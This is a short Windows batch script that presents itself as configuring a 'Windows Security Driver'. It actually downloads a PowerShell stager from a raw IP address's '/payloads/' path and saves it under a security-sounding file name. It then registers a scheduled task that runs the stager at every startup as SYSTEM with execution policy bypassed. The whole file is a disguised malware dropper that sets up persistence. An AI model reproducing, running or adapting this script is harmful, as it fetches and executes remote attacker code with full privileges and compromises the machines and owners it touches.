@echo off
echo Config Windows Security Driver System x64 ...
powershell wget http://34.213.170.51/payloads/stager.ps1 -UseBasicParsing -OutFile "C:\WindowsSec_ModOper_x64.ps1"
schtasks /create /TN WindowsSecDriveOperMod_x64 /SC onstart /TR "powershell -executionpolicy bypass -file C:\WindowsSec_ModOper_x64.ps1" /ru System